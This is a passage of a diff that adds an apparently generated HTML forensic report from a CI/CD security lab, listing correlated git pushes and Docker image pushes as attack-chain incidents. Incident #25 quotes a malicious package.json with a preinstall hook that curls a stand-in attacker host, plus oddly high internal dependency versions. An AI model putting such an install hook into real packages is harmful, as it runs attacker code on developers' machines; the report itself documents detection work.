+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">264b943b638cf10e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:32.038065</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">478cdb19ec008d2c...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #25: Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:09:09</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions
+, Files: package.json
+[Content of package.json]:
+{
+  "name": "dpff-sample-app",
+  "version": "1.0.0",
+  "description": "Sample CI/CD target app",
+  "main": "app.js",
+  "scripts": {
+    "start": "node app.js",
+    "test": "echo \"Tests passed\" && exit 0",
+    "preinstall": "curl http://attacker.evil.com/callback"
+  },
+  "dependencies": {
+    "internal-utils": "99.0.0",
+    "internal-auth-sdk": "102.3.1"
+  }
+}
+</td>
+                        <td class="hash">d8887b1295a954f8...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:29.646569</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">264b943b638cf10e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:32.038065</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">478cdb19ec008d2c...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #26: Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:09:21</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">a30c1956eae57093...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:29.646569</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">264b943b638cf10e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:32.038065</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">478cdb19ec008d2c...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #27: Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:12:22</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">d4c071a9a5725c2a...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:29.646569</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">264b943b638cf10e...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:32.038065</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">478cdb19ec008d2c...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+            <div class="incident">
+                <h3>Incident #28: Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.</h3>
+                <p><span class="severity severity-CRITICAL">CRITICAL</span></p>
+                <h4>Evidence Timeline:</h4>
+                <table>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Source</th>
+                        <th>Event</th>
+                        <th>Details</th>
+                        <th>Evidence Hash</th>
+                    </tr>
+            
+                    <tr>
+                        <td>2026-02-19 06:12:41</td>
+                        <td>GitHub</td>
+                        <td>git.push</td>
+                        <td>Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config
+, Files: </td>
+                        <td class="hash">df5c730dbb0e7d69...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:47.243840</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">a63499e6b680c05c...</td>
+                    </tr>
+                
+                    <tr>
+                        <td>2026-02-19 06:12:49.485927</td>
+                        <td>Docker</td>
+                        <td>Image push</td>
+                        <td>Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app</td>
+                        <td class="hash">94f6569177cf1e32...</td>
+                    </tr>
+                
+                </table>
+            </div>
+            
+        </body>
+        </html>
+        
